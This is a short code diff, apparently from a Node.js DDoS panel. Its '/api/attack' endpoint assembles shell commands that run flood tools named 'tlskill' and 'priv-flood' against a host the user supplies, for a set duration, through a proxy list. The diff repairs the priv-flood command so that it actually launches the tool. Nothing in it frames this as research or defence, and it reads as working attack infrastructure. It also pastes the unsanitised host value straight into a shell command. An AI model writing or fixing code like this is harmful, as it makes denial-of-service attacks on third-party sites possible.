@@ -67,7 +67,7 @@ app.get("/api/attack", (req, res) => {
       command = `node --max-old-space-size=65536 tlskill ${host} ${time} 10 10 live.txt --icecool true --dual true --brave true`;
       break;
     case "priv-flood":
-      command = `node --max-old-space-size=65536 -m GET -u ${host} -s ${time} -p live.txt --ratelimit true --full true`;
+      command = `node --max-old-space-size=65536 priv-flood -m GET -u ${host} -s ${time} -p live.txt --ratelimit true --full true`;
       break;
   }
 
